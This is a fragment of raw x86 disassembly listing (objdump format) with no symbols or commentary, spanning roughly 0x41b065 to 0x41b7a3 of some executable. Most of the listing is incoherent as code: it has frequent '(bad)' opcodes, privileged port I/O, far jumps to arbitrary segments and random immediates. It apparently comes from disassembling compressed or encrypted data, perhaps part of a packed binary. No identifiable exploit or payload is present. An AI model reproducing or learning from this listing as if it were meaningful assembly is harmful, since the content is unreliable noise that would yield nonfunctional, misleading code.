  41b065:	xor    BYTE PTR [eax+0x7f128b8a],cl
  41b06b:	xor    eax,0x8c7a205f
  41b070:	test   dl,ch
  41b072:	jg     0x41b05b
  41b074:	repnz pop DWORD PTR [ebx-0x2160f3c3]
  41b07b:	fst    QWORD PTR [ecx]
  41b07d:	scas   eax,DWORD PTR es:[edi]
  41b07e:	pop    es
  41b07f:	call   DWORD PTR ds:0x10b0c311
  41b085:	call   0x8c573391
  41b08a:	sub    al,BYTE PTR [ebp+0x75e086f9]
  41b090:	jmp    0x41b0bd
  41b092:	pop    esi
  41b093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b094:	or     al,al
  41b096:	data16 mov dl,BYTE PTR [esi+0x1]
  41b09a:	cmp    al,0xba
  41b09c:	and    eax,0x6ffda73c
  41b0a1:	clc    
  41b0a2:	or     esi,DWORD PTR [esi+edi*1+0x3c]
  41b0a6:	or     al,0xf4
  41b0a8:	cmp    al,0xd
  41b0aa:	je     0x41b108
  41b0ac:	cmp    al,0xe
  41b0ae:	je     0x41b126
  41b0b0:	cmp    al,0xf
  41b0b2:	pop    eax
  41b0b3:	test   dh,dl
  41b0b5:	inc    BYTE PTR [edx+ebx*8]
  41b0b8:	cmp    al,0x11
  41b0ba:	push   cs
  41b0bb:	mov    ecx,DWORD PTR [ebx+0x1845e36]
  41b0c1:	int3   
  41b0c2:	sub    eax,0x7fd3dddd
  41b0c7:	or     al,ch
  41b0c9:	and    DWORD PTR [ecx-0x77],ebp
  41b0cc:	retf   0xcc17
  41b0cf:	imul   edi,eax,0x26
  41b0d2:	call   0x3233:0x778f0739
  41b0d9:	push   esi
  41b0da:	outs   dx,BYTE PTR ds:[esi]
  41b0db:	es jg  0x41b09f
  41b0de:	push   es
  41b0df:	es dec eax
  41b0e1:	add    esi,DWORD PTR ds:0xebf3486c
  41b0e7:	pop    edi
  41b0e8:	push   ebp
  41b0e9:	mov    ebp,edx
  41b0eb:	mov    ebp,DWORD PTR [esi+0x54edc160]
  41b0f1:	or     ch,BYTE PTR cs:[edx]
  41b0f4:	add    ebx,DWORD PTR [esi+ebp*1-0x6]
  41b0f8:	dec    esp
  41b0f9:	mov    al,cs:0x9dd33912
  41b0ff:	fstp   QWORD PTR [ebx-0x14a2177c]
  41b105:	inc    ecx
  41b106:	cmp    dh,BYTE PTR [ebx]
  41b108:	mov    edx,esi
  41b10a:	sub    edi,DWORD PTR [eax]
  41b10c:	cmp    ah,BYTE PTR [edi+0x75]
  41b10f:	dec    ebp
  41b110:	lock sub eax,DWORD PTR [ebp+0x1c858d04]
  41b117:	add    eax,0x1cccce6e
  41b11c:	cmp    ah,BYTE PTR [ecx]
  41b11e:	cmp    bh,BYTE PTR [eax-0x4df4140f]
  41b124:	lock jo 0x41b0e0
  41b127:	or     ebp,0xb069e15
  41b12d:	inc    edx
  41b12e:	stc    
  41b12f:	cmp    ecx,ebp
  41b131:	out    dx,eax
  41b132:	pop    ds
  41b133:	add    ebx,DWORD PTR [ebp+ebp*1+0x19]
  41b137:	adc    al,0x17
  41b139:	add    DWORD PTR [ebp-0x7c],ebx
  41b13c:	or     eax,0x418ac0ff
  41b141:	add    DWORD PTR [ebp+0x6fbc087c],ecx
  41b147:	cld    
  41b148:	or     al,0x4f
  41b14a:	clc    
  41b14b:	push   ecx
  41b14c:	pop    esp
  41b14d:	js     0x41b132
  41b14f:	mov    edi,0xc1290406
  41b154:	jle    0x41b161
  41b156:	mov    edx,eax
  41b158:	add    eax,esi
  41b15a:	mov    cl,0x2c
  41b15c:	inc    edi
  41b15d:	outs   dx,BYTE PTR ds:[esi]
  41b15e:	or     eax,0x12566c7f
  41b163:	mov    cl,BYTE PTR [edx]
  41b165:	cmp    cl,0x56
  41b168:	xor    DWORD PTR [eax],ecx
  41b16a:	or     esi,DWORD PTR [ebp+edi*1+0x60]
  41b16e:	outs   dx,BYTE PTR ds:[esi]
  41b16f:	outs   dx,BYTE PTR ds:[esi]
  41b170:	outs   dx,BYTE PTR ds:[esi]
  41b171:	or     al,0x74
  41b173:	dec    ecx
  41b174:	or     eax,0x740e5574
  41b179:	jo     0x41b0fd
  41b17b:	shl    DWORD PTR [ebx+esi*8+0x11108060],cl
  41b182:	mov    BYTE PTR [edx],ah
  41b184:	adc    al,0x15
  41b186:	pop    es
  41b187:	dec    esi
  41b188:	shr    DWORD PTR [ebx],1
  41b18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b18b:	xor    BYTE PTR [eax+ebx*8-0x22],ah
  41b18f:	adc    BYTE PTR [ecx],0xb
  41b192:	xlat   BYTE PTR ds:[ebx]
  41b193:	jmp    0x41b212
  41b195:	and    DWORD PTR [edx],ebp
  41b197:	aas    
  41b198:	cmp    DWORD PTR [edx+0x32],esi
  41b19b:	in     al,0x6c
  41b19d:	lea    esi,[esi]
  41b19f:	jl     0x41b159
  41b1a1:	adc    BYTE PTR [ebx+0x3c],bl
  41b1a4:	push   edi
  41b1a5:	pop    esp
  41b1a6:	sub    dl,dh
  41b1a8:	lock (bad) 
  41b1aa:	call   0x4cb6b0b1
  41b1af:	jge    0x41b1a0
  41b1b1:	xchg   DWORD PTR [ebp-0x8],ebx
  41b1b4:	or     DWORD PTR [edi+0x37],eax
  41b1b7:	mov    al,0x58
  41b1b9:	jmp    0x41b1f6
  41b1bb:	aas    
  41b1bc:	add    dl,BYTE PTR cs:[ecx+0x39]
  41b1c0:	lods   al,BYTE PTR ds:[esi]
  41b1c1:	sbb    eax,0x9479ee33
  41b1c6:	xor    BYTE PTR [edx],ah
  41b1c8:	mov    ch,0x42
  41b1ca:	sbb    al,0x88
  41b1cc:	in     eax,0x30
  41b1ce:	sbb    edx,DWORD PTR [ecx]
  41b1d0:	ds and eax,0xab83f43a
  41b1d6:	aas    
  41b1d7:	cmp    esi,eax
  41b1d9:	fs dec ebp
  41b1db:	jne    0xd29babf5
  41b1e1:	(bad)  
  41b1e2:	and    eax,0x18661176
  41b1e7:	add    edi,ebx
  41b1e9:	rcr    DWORD PTR [edi+0x454f4523],0x8b
  41b1f0:	ins    BYTE PTR es:[edi],dx
  41b1f1:	and    al,0x14
  41b1f3:	mov    cl,BYTE PTR [edi]
  41b1f5:	in     eax,dx
  41b1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1f7:	push   edx
  41b1f8:	test   eax,0x6152431c
  41b1fd:	jge    0x41b216
  41b1ff:	adc    dh,BYTE PTR [edx]
  41b201:	enter  0x9c91,0x58
  41b205:	out    dx,eax
  41b206:	stos   DWORD PTR es:[edi],eax
  41b207:	lds    eax,FWORD PTR [ecx+0x16]
  41b20a:	jmp    0x41b266
  41b20c:	cmp    BYTE PTR [ebp+0x75],cl
  41b20f:	out    dx,al
  41b210:	sub    al,0x38
  41b212:	mov    al,0x78
  41b214:	enter  0x9b93,0x32
  41b218:	in     al,0xeb
  41b21a:	jp     0x41b1c3
  41b21c:	push   cs
  41b21d:	sub    cl,BYTE PTR [ebp+0x3b]
  41b220:	std    
  41b221:	adc    BYTE PTR es:[eax],dl
  41b224:	les    cx,DWORD PTR [edi+0x7]
  41b228:	scas   eax,DWORD PTR es:[edi]
  41b229:	jo     0x41b25a
  41b22b:	xor    BYTE PTR [ecx],bh
  41b22d:	add    bh,BYTE PTR [ecx]
  41b22f:	es or  bh,bh
  41b232:	ja     0x41b238
  41b234:	sti    
  41b235:	vpmaxsw xmm6,xmm7,xmm6
  41b239:	add    ebx,DWORD PTR [edi]
  41b23b:	add    esi,DWORD PTR [edi]
  41b23d:	inc    eax
  41b23e:	jmp    0xf1f9:0x892f45eb
  41b245:	mov    BYTE PTR [edi],al
  41b247:	call   0x3870:0x147e3bd
  41b24e:	add    al,BYTE PTR [ebx]
  41b250:	je     0x41b258
  41b252:	cmp    ch,ah
  41b254:	push   eax
  41b255:	js     0x41b2c5
  41b257:	xchg   edx,eax
  41b258:	xor    ecx,ebx
  41b25a:	inc    edx
  41b25b:	sbb    al,0x14
  41b25d:	daa    
  41b25e:	popa   
  41b25f:	inc    edi
  41b260:	xor    BYTE PTR [eax],bl
  41b262:	data16 adc ch,BYTE PTR [ebx]
  41b265:	in     al,dx
  41b266:	pop    ebx
  41b267:	lods   al,BYTE PTR ds:[esi]
  41b268:	nop
  41b269:	xor    ah,al
  41b26b:	clc    
  41b26c:	shl    BYTE PTR [eax+0x65805711],0xef
  41b273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b274:	scas   eax,DWORD PTR es:[edi]
  41b275:	(bad)  
  41b276:	mul    DWORD PTR [esp]
  41b279:	mov    ecx,eax
  41b27b:	in     eax,0x64
  41b27d:	and    al,0xc
  41b27f:	add    DWORD PTR [edx],edx
  41b281:	or     DWORD PTR [ebx],edx
  41b283:	loopne 0x41b2d4
  41b285:	jb     0x41b298
  41b287:	retf   0x5959
  41b28a:	call   0xf0636ae7
  41b28f:	pop    ebx
  41b290:	pop    ss
  41b291:	xchg   esp,eax
  41b292:	cmp    al,dl
  41b294:	dec    eax
  41b295:	pop    es
  41b296:	push   DWORD PTR [ebp+0x8]
  41b299:	push   cs
  41b29a:	pop    ds
  41b29b:	(bad)  
  41b29c:	cmp    BYTE PTR [ebx],bh
  41b29e:	xlat   BYTE PTR ds:[ebx]
  41b29f:	cmc    
  41b2a0:	mov    ds,WORD PTR [ebp+0x478ee93a]
  41b2a6:	push   cs
  41b2a7:	(bad)  
  41b2a8:	in     al,0xef
  41b2aa:	dec    ebp
  41b2ab:	xor    BYTE PTR [edx+edi*1+0x10],cl
  41b2af:	sahf   
  41b2b0:	lods   al,BYTE PTR ds:[esi]
  41b2b1:	sub    ch,BYTE PTR [ebp+0x46]
  41b2b4:	xor    esp,DWORD PTR [ebx+0xe]
  41b2b7:	call   0x565a3e14
  41b2bc:	int3   
  41b2bd:	sbb    eax,0x541b815d
  41b2c2:	pop    es
  41b2c3:	mov    al,0x4
  41b2c5:	xor    eax,0xff454837
  41b2ca:	pop    ss
  41b2cb:	in     al,0xb7
  41b2cd:	in     al,0x3a
  41b2cf:	mov    eax,ds:0x7d83ff33
  41b2d4:	call   0xf6c0c059
  41b2d9:	pop    esp
  41b2da:	ret    0x6d83
  41b2dd:	ss cmp BYTE PTR fs:[ecx],dl
  41b2e1:	clc    
  41b2e2:	movzx  eax,BYTE PTR [eax+0x1]
  41b2e6:	add    DWORD PTR [ecx],eax
  41b2e8:	fwait
  41b2e9:	jle    0x41b2f6
  41b2eb:	pop    ds
  41b2ec:	jo     0x41b284
  41b2ee:	push   eax
  41b2ef:	push   es
  41b2f0:	sub    eax,ecx
  41b2f2:	push   cs
  41b2f3:	nop
  41b2f4:	fmulp  st(0),st
  41b2f6:	sbb    al,0x7d
  41b2f8:	cmp    dl,BYTE PTR [eax]
  41b2fa:	mov    edi,0xeef79804
  41b2ff:	mov    ch,0xec
  41b301:	pop    edi
  41b302:	sbb    esi,DWORD PTR [esi-0x6f]
  41b305:	js     0x41b342
  41b307:	lock je 0x41b2c9
  41b30a:	and    DWORD PTR [eax],0x8
  41b30d:	mov    ds:0xbb7d2b08,eax
  41b312:	jg     0x41b2ae
  41b314:	cmp    DWORD PTR [eax],0x1
  41b317:	jne    0x41b355
  41b319:	push   cs
  41b31a:	push   eax
  41b31b:	in     al,0x3b
  41b31d:	sti    
  41b31e:	jle    0x41b33f
  41b320:	lahf   
  41b321:	cld    
  41b322:	aaa    
  41b323:	sbb    DWORD PTR [ebp+0x19],ebx
  41b326:	das    
  41b327:	rcl    BYTE PTR [edi+ecx*1-0x51],0xd6
  41b32c:	add    eax,edx
  41b32e:	mov    ecx,edi
  41b330:	sub    ecx,ebx
  41b332:	add    BYTE PTR [ecx-0xfe0e850],0x8d
  41b339:	dec    edx
  41b33a:	test   BYTE PTR [edi-0x11],dh
  41b33d:	inc    ecx
  41b33e:	mov    bl,0x31
  41b340:	inc    esi
  41b341:	in     al,0x7e
  41b343:	jmp    0x41b3a8
  41b345:	push   esi
  41b346:	call   DWORD PTR [eax-0x1307ad7]
  41b34c:	fist   WORD PTR [eax-0xf8276de]
  41b352:	cmp    ebx,DWORD PTR [ebp-0x10]
  41b355:	jge    0x41b35a
  41b357:	mov    DWORD PTR [eax],ecx
  41b359:	cdq    
  41b35a:	sub    al,0xb
  41b35c:	(bad)  
  41b35e:	mov    ecx,0x33a58e9e
  41b363:	leave  
  41b364:	dec    esp
  41b365:	sbb    al,0x30
  41b367:	fwait
  41b368:	dec    ecx
  41b369:	fs push esp
  41b36b:	ss push eax
  41b36d:	inc    eax
  41b36e:	mov    ds:0x55f98d1,al
  41b373:	mov    esi,0x42e0bb4d
  41b378:	dec    ebp
  41b379:	push   esi
  41b37a:	into   
  41b37b:	mov    edx,DWORD PTR [ebp-0x7e]
  41b37e:	cmp    edi,DWORD PTR [edx+0x30]
  41b381:	int3   
  41b382:	inc    ebp
  41b383:	sub    ecx,DWORD PTR [edx-0x30]
  41b386:	jle    0x41b398
  41b388:	sub    BYTE PTR [ecx+0x372f63b],al
  41b38e:	mov    DWORD PTR [eax],ebx
  41b390:	fld    TBYTE PTR [ebx+ebp*8-0x2]
  41b394:	adc    ebx,edx
  41b396:	sub    edx,edi
  41b398:	mov    cl,0xc6
  41b39a:	or     bh,al
  41b39c:	add    ebx,DWORD PTR [esi]
  41b39e:	mov    ch,0xe6
  41b3a0:	mov    ebx,0xf47b70d1
  41b3a5:	add    DWORD PTR [esi+0x28],edi
  41b3a8:	or     BYTE PTR ds:[edi+edi*8],al
  41b3ac:	(bad)  
  41b3ad:	dec    ebx
  41b3ae:	fs sbb al,0x43
  41b3b1:	add    al,0xed
  41b3b3:	aaa    
  41b3b4:	shl    BYTE PTR [ebx],1
  41b3b6:	mul    BYTE PTR [esi+ebp*2]
  41b3b9:	lea    eax,[eax+esi*4]
  41b3bc:	shl    ah,0x97
  41b3bf:	inc    edi
  41b3c0:	ret    0xfe1e
  41b3c3:	cmp    DWORD PTR [eax],eax
  41b3c5:	inc    esi
  41b3c6:	dec    ebx
  41b3c7:	jne    0x41b3b0
  41b3c9:	aad    0x9e
  41b3cb:	xchg   esi,eax
  41b3cc:	js     0x41b3e3
  41b3ce:	not    esp
  41b3d0:	mov    esp,ebp
  41b3d2:	retf   
  41b3d3:	rcl    BYTE PTR [ebx+eax*4-0x2a],0x4
  41b3d8:	inc    ecx
  41b3d9:	jg     0x41b37c
  41b3db:	mov    eax,ds:0x33afaea0
  41b3e0:	pop    ds
  41b3e1:	lock jmp FWORD PTR [edx+0x26]
  41b3e5:	mov    eax,ds:0x75f849f0
  41b3ea:	daa    
  41b3eb:	mov    esi,0xb9e054f5
  41b3f0:	lock sub BYTE PTR [esi+edx*2],0xfc
  41b3f5:	inc    esp
  41b3f6:	pop    es
  41b3f7:	enter  0x2121,0x16
  41b3fb:	mov    esi,DWORD PTR [ebp+ecx*2-0x7c]
  41b3ff:	test   esi,ebp
  41b401:	or     BYTE PTR [esi],cl
  41b403:	sbb    BYTE PTR [eax+0x61],al
  41b406:	cld    
  41b407:	dec    ebp
  41b408:	inc    esp
  41b409:	imul   edx,esp,0x14
  41b40c:	push   cs
  41b40d:	dec    ebx
  41b40e:	inc    eax
  41b40f:	push   eax
  41b410:	push   edx
  41b411:	mov    edx,ecx
  41b413:	inc    DWORD PTR [ebx-0x8]
  41b416:	jle    0x41b440
  41b418:	pusha  
  41b419:	jg     0x41b44a
  41b41b:	pop    edx
  41b41c:	pop    eax
  41b41d:	out    dx,al
  41b41e:	(bad)  
  41b41f:	xor    BYTE PTR [edx+0x1c],ch
  41b422:	push   0xa41585fc
  41b427:	pop    ecx
  41b428:	xor    al,0x81
  41b42a:	mov    ds:0xbeebf1e0,eax
  41b42f:	or     BYTE PTR [ebp+0x6],dh
  41b432:	std    
  41b433:	ret    0x7eb1
  41b436:	push   ebp
  41b437:	sub    eax,0x81271cf2
  41b43c:	(bad)  
  41b43d:	clc    
  41b43e:	sub    cl,BYTE PTR [edx+0x76]
  41b441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b442:	icebp  
  41b443:	fadd   DWORD PTR [ebx+0x682b8e7b]
  41b449:	add    eax,0xc7f0335a
  41b44e:	cli    
  41b44f:	fisttp QWORD PTR [ebx-0x743b02bd]
  41b455:	les    esi,FWORD PTR [edx+0x6a023b5a]
  41b45b:	loop   0x41b49a
  41b45d:	fdivr  DWORD PTR [eax+0x5c6d84d4]
  41b463:	imul   esi,DWORD PTR [edi+0x10438934],0xa
  41b46a:	adc    BYTE PTR [esi+0x8],dh
  41b46d:	pop    esp
  41b46e:	or     al,0xbc
  41b470:	push   edx
  41b471:	dec    eax
  41b472:	iret   
  41b473:	cli    
  41b474:	mov    esi,esp
  41b476:	mov    eax,ds:0xae24b030
  41b47b:	hlt    
  41b47c:	pop    esi
  41b47d:	push   es
  41b47e:	stos   BYTE PTR es:[edi],al
  41b47f:	sub    ebx,DWORD PTR [edx]
  41b481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b482:	popa   
  41b483:	dec    ecx
  41b484:	test   al,0xac
  41b486:	sub    ebx,esp
  41b488:	mov    ds:0xcf846e3,eax
  41b48d:	jne    0x41b49a
  41b48f:	and    eax,0x9c8b443b
  41b494:	or     eax,0x63a57f89
  41b499:	sbb    ebx,esi
  41b49b:	aad    0x8b
  41b49d:	sti    
  41b49e:	mov    eax,edi
  41b4a0:	pop    edx
  41b4a1:	adc    bl,BYTE PTR [ebx]
  41b4a3:	mov    bh,0x9
  41b4a5:	das    
  41b4a6:	push   ecx
  41b4a7:	xchg   esi,eax
  41b4a8:	lea    esi,[ebp-0x4]
  41b4ab:	pop    esp
  41b4ac:	dec    ebx
  41b4ad:	loop   0x41b430
  41b4af:	or     DWORD PTR [eax+0x30928403],esp
  41b4b5:	sti    
  41b4b6:	dec    ebp
  41b4b7:	ret    0x188a
  41b4ba:	push   ss
  41b4bb:	add    eax,0x755cfb80
  41b4c0:	jmp    0x545004dd
  41b4c5:	nop
  41b4c6:	retf   
  41b4c7:	pop    DWORD PTR [eax]
  41b4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ca:	pop    ebp
  41b4cb:	jmp    0x686a:0xff88c41d
  41b4d2:	mov    eax,0xf774404d
  41b4d7:	adc    bl,BYTE PTR [edx]
  41b4d9:	add    esp,ecx
  41b4db:	xor    eax,DWORD PTR [eax+ebp*2-0x38]
  41b4df:	push   ds
  41b4e0:	add    al,0x8f
  41b4e2:	push   ds
  41b4e3:	lods   eax,DWORD PTR ds:[esi]
  41b4e4:	in     eax,0xd4
  41b4e6:	xchg   edx,eax
  41b4e7:	inc    edi
  41b4e8:	xor    bh,cl
  41b4ea:	push   edx
  41b4eb:	pop    esp
  41b4ec:	add    ebp,edi
  41b4ee:	test   DWORD PTR [ebp-0xf7af86],esp
  41b4f4:	pop    esi
  41b4f5:	sbb    BYTE PTR [ebx+0x7b],0x74
  41b4f9:	cld    
  41b4fa:	inc    esp
  41b4fb:	clc    
  41b4fc:	push   eax
  41b4fd:	sub    esp,DWORD PTR [edi-0x80]
  41b500:	mov    ebx,0x3dd2fdf6
  41b505:	test   al,0x1a
  41b507:	cmp    BYTE PTR [eax],0xf6
  41b50a:	inc    ecx
  41b50b:	vmread DWORD PTR [ecx],eax
  41b50e:	pop    esp
  41b50f:	push   0xcc5771d0
  41b514:	daa    
  41b515:	jle    0x41b52f
  41b517:	into   
  41b518:	add    bl,BYTE PTR [edi-0x13eca02c]
  41b51e:	adc    DWORD PTR [ecx+0x330d1a44],0xfffffff0
  41b525:	retf   
  41b526:	push   ds
  41b527:	xor    BYTE PTR [eax+eax*2+0x970f52f],dh
  41b52e:	addr16 sub eax,0x917ef6d8
  41b534:	xchg   edx,eax
  41b535:	sub    ebx,DWORD PTR [ebp-0x4]
  41b538:	lea    eax,[ebx+0x1]
  41b53b:	shr    ecx,cl
  41b53d:	loope  0x41b560
  41b53f:	mov    edx,0x8388ed69
  41b544:	(bad)  
  41b545:	jge    0x41b533
  41b547:	sub    edi,esi
  41b549:	inc    esi
  41b54a:	bound  esi,QWORD PTR [eax-0x7b]
  41b54d:	sbb    al,bl
  41b54f:	inc    eax
  41b550:	cmp    eax,0xd996b06e
  41b555:	jbe    0x41b4f2
  41b557:	test   eax,0x71465747
  41b55c:	xor    dh,BYTE PTR [ebp-0x74]
  41b55f:	outs   dx,BYTE PTR ds:[esi]
  41b560:	or     eax,0xfeaaced7
  41b565:	fwait
  41b566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b567:	push   es
  41b568:	and    DWORD PTR [esp+esi*2],0x7b
  41b56c:	push   esi
  41b56d:	cmc    
  41b56e:	pop    ds
  41b56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b570:	jmp    0x261851b4
  41b575:	add    al,0x8d
  41b577:	push   ebx
  41b578:	add    DWORD PTR [ebp+0xc4cfddb],edi
  41b57e:	mov    eax,ds:0x84c65c7f
  41b583:	sbb    eax,0x1db85c65
  41b588:	sub    eax,ebx
  41b58a:	dec    eax
  41b58b:	push   eax
  41b58c:	jno    0x41b5fb
  41b58e:	sbb    esi,DWORD PTR [esi-0x40bf42ad]
  41b594:	jg     0x41b5d6
  41b596:	xor    DWORD PTR [esi-0x3f],ecx
  41b599:	adc    ebx,DWORD PTR [edx]
  41b59b:	in     al,dx
  41b59c:	rol    DWORD PTR [ebp+0x44c94e49],0xac
  41b5a3:	xchg   BYTE PTR [ecx-0x6a800532],al
  41b5a9:	nop
  41b5aa:	adc    edx,DWORD PTR [eax+0x6e72656b]
  41b5b0:	gs ins BYTE PTR es:[edi],dx
  41b5b2:	xor    esi,DWORD PTR [edx]
  41b5b4:	cs fs ins BYTE PTR es:[edi],dx
  41b5b7:	ins    BYTE PTR es:[edi],dx
  41b5b8:	push   ebx
  41b5b9:	jmp    0x4840edbd
  41b5be:	gs je  0x41b60d
  41b5c1:	outs   dx,DWORD PTR ds:[esi]
  41b5c2:	outs   dx,BYTE PTR ds:[esi]
  41b5c3:	addr16 push eax
  41b5c5:	popa   
  41b5c6:	je     0x41b630
  41b5c8:	dec    esi
  41b5c9:	popa   
  41b5ca:	ins    DWORD PTR es:[edi],dx
  41b5cb:	mov    dh,0x0
  41b5cd:	sub    edx,DWORD PTR [esi]
  41b5cf:	out    0x8b,eax
  41b5d1:	scas   eax,DWORD PTR es:[edi]
  41b5d2:	fdiv   st(6),st
  41b5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d5:	push   ecx
  41b5d6:	ds sti 
  41b5d8:	dec    edi
  41b5d9:	mov    ecx,0xc4adeddf
  41b5de:	mov    BYTE PTR [ebp-0x12],0x22
  41b5e2:	into   
  41b5e3:	push   0x85669319
  41b5e8:	shr    al,1
  41b5ea:	add    BYTE PTR [eax+eiz*1],ah
  41b5ed:	push   eax
  41b5ee:	add    DWORD PTR [esi],ebp
  41b5f0:	cmp    edx,ebx
  41b5f2:	sbb    edx,DWORD PTR [edx+0x322023b]
  41b5f8:	pop    eax
  41b5f9:	enter  0x77c0,0x3c
  41b5fd:	outs   dx,DWORD PTR ds:[esi]
  41b5fe:	enter  0xe10b,0x9
  41b602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b603:	loopne 0x41b653
  41b605:	cmp    BYTE PTR [esi],bh
  41b607:	or     bh,cl
  41b609:	pusha  
  41b60a:	xor    BYTE PTR [ecx+ecx*1-0x46],0x1f
  41b60f:	push   ds
  41b610:	cmp    al,0x60
  41b612:	adc    edx,0xeee8c454
  41b618:	inc    ecx
  41b619:	shr    DWORD PTR [ebp-0x6f],cl
  41b61c:	into   
  41b61d:	sti    
  41b61e:	int    0x24
  41b620:	aas    
  41b621:	iret   
  41b622:	pop    esp
  41b623:	shl    BYTE PTR [esi+0x30],0xb0
  41b627:	cmp    eax,DWORD PTR [ecx+ecx*4]
  41b62a:	push   es
  41b62b:	repnz add BYTE PTR [esi],cl
  41b62e:	popa   
  41b62f:	cmp    edx,esp
  41b631:	mov    cl,0xe7
  41b633:	dec    esi
  41b634:	inc    ebx
  41b635:	sbb    eax,0xb071ce41
  41b63a:	sti    
  41b63b:	aas    
  41b63c:	(bad)  
  41b63e:	sti    
  41b63f:	scas   eax,DWORD PTR es:[edi]
  41b640:	imul   ebx,edx,0x6a
  41b643:	add    eax,0x1903f3ac
  41b648:	in     al,0x25
  41b64a:	mov    esp,0xbd80db33
  41b64f:	inc    ecx
  41b650:	xor    eax,0xcc87c27d
  41b655:	stc    
  41b656:	outs   dx,BYTE PTR ds:[esi]
  41b657:	jge    0x41b64c
  41b659:	test   al,0xa
  41b65b:	mov    ebx,0xaaf3b48
  41b660:	out    dx,al
  41b661:	push   ds
  41b662:	jmp    0x17d7a2e2
  41b667:	add    eax,0xf2850158
  41b66c:	xor    al,0xeb
  41b66e:	add    ebx,DWORD PTR [edx+0x3766dbe4]
  41b674:	adc    eax,0x742ee47a
  41b679:	or     eax,DWORD PTR [edi+0x3b]
  41b67c:	sbb    dh,BYTE PTR [ebp-0x16]
  41b67f:	adc    eax,0x1811f770
  41b684:	in     eax,0xff
  41b686:	inc    edx
  41b687:	xchg   esp,eax
  41b688:	out    dx,al
  41b689:	pusha  
  41b68a:	mov    ds,WORD PTR [edi]
  41b68c:	out    0xe4,al
  41b68e:	sub    edx,eax
  41b690:	inc    ebx
  41b691:	ret    0x76b5
  41b694:	sub    esi,DWORD PTR [eax+0x2]
  41b697:	or     esp,DWORD PTR ds:0x36cb4544
  41b69d:	clc    
  41b69e:	(bad)  
  41b69f:	in     al,dx
  41b6a0:	dec    eax
  41b6a1:	jne    0x41b715
  41b6a3:	or     eax,0x772f6c74
  41b6a8:	xor    bl,BYTE PTR [esp+0x17]
  41b6ac:	repz ss fbstp TBYTE PTR ss:[ecx+0x2a]
  41b6b2:	pop    si
  41b6b4:	jae    0x41b641
  41b6b6:	ret    
  41b6b7:	iret   
  41b6b8:	push   ebx
  41b6b9:	outs   dx,DWORD PTR ds:[esi]
  41b6ba:	data16 ja 0x41b641
  41b6bd:	dec    ecx
  41b6be:	clc    
  41b6bf:	je     0x41b738
  41b6c1:	popa   
  41b6c2:	jb     0x41b729
  41b6c4:	dec    edi
  41b6c5:	retf   0x6163
  41b6c8:	ins    BYTE PTR es:[edi],dx
  41b6c9:	cmp    eax,0x65d9ab09
  41b6ce:	jae    0x41b702
  41b6d0:	aaa    
  41b6d1:	xchg   eax,edi
  41b6d3:	or     DWORD PTR [edi-0x54],ebx
  41b6d6:	inc    ebp
  41b6d7:	ret    
  41b6d8:	inc    eax
  41b6d9:	ins    BYTE PTR es:[edi],dx
  41b6da:	xlat   BYTE PTR ds:[ebx]
  41b6db:	inc    eax
  41b6dc:	mov    WORD PTR [ebx+esi*1-0x4700e50f],es
  41b6e3:	mov    al,0x40
  41b6e5:	push   0xffffff80
  41b6e7:	lahf   
  41b6e8:	and    edx,DWORD PTR ds:0x9310cb34
  41b6ee:	xchg   ecx,eax
  41b6ef:	add    BYTE PTR [esi-0xec5c4c],ch
  41b6f5:	or     BYTE PTR [eax-0xf2f7878],cl
  41b6fb:	ret    0x34a1
  41b6fe:	stc    
  41b6ff:	loopne 0x41b6fe
  41b701:	adc    esp,esi
  41b703:	je     0x41b72a
  41b705:	or     edi,DWORD PTR [ebx]
  41b707:	(bad)  
  41b708:	jne    0x41b725
  41b70a:	das    
  41b70b:	sub    eax,0xe413ee70
  41b710:	gs mov edx,0xebb13499
  41b716:	inc    ecx
  41b717:	lods   eax,DWORD PTR ds:[esi]
  41b718:	adc    edi,DWORD PTR [edx+0x3f1a1240]
  41b71e:	pop    esp
  41b71f:	ss pop ebp
  41b721:	add    DWORD PTR [eax+0x7e72d682],esp
  41b727:	inc    ebx
  41b728:	addr16 sbb al,0xc8
  41b72b:	cmp    BYTE PTR [ebx+0x1a],bh
  41b72e:	push   0xcfe06a22
  41b733:	dec    ebp
  41b734:	lods   al,BYTE PTR ds:[esi]
  41b735:	push   esi
  41b736:	add    ch,BYTE PTR [ecx+0xb]
  41b739:	xor    DWORD PTR [ebx+0x75],ebp
  41b73c:	retf   0x9d59
  41b73f:	push   esi
  41b740:	and    al,0x38
  41b742:	jns    0x41b783
  41b744:	je     0x41b71f
  41b746:	call   0x7c219775
  41b74b:	cmp    DWORD PTR [edi+0x43d35153],esp
  41b751:	jo     0x41b758
  41b753:	cli    
  41b754:	loop   0x41b718
  41b756:	js     0x41b78a
  41b758:	dec    esp
  41b759:	inc    eax
  41b75a:	add    al,0xbb
  41b75c:	or     ah,BYTE PTR [edi]
  41b75e:	pop    esp
  41b75f:	cmp    BYTE PTR [ebx+eax*8+0x7571f656],al
  41b766:	(bad)  
  41b767:	mov    bh,0x2e
  41b769:	mov    eax,0x30ec414b
  41b76e:	mov    ds:0x492cff0d,eax
  41b773:	ja     0x41b735
  41b775:	in     al,dx
  41b776:	mov    ch,0xfd
  41b778:	and    BYTE PTR [edi],al
  41b77a:	pop    ecx
  41b77b:	sub    BYTE PTR [eax+eiz*8],cl
  41b77e:	(bad)  
  41b77f:	inc    ecx
  41b780:	adc    al,0x4
  41b782:	push   edx
  41b783:	lahf   
  41b784:	adc    eax,0x53b2b76
  41b789:	jne    0x41b800
  41b78b:	or     al,0x9
  41b78d:	(bad)  
  41b78e:	jmp    0x41b786
  41b790:	pop    ebp
  41b791:	lock xor DWORD PTR [edx],0xf5244b63
  41b798:	cmp    edi,DWORD PTR [edx+eax*4]
  41b79b:	add    eax,0xaa476c26
  41b7a0:	in     al,dx
  41b7a1:	jmp    0x41b7b1
  41b7a3:	and    DWORD PTR [ebx+eax*4+0x39dc0e9b],esp
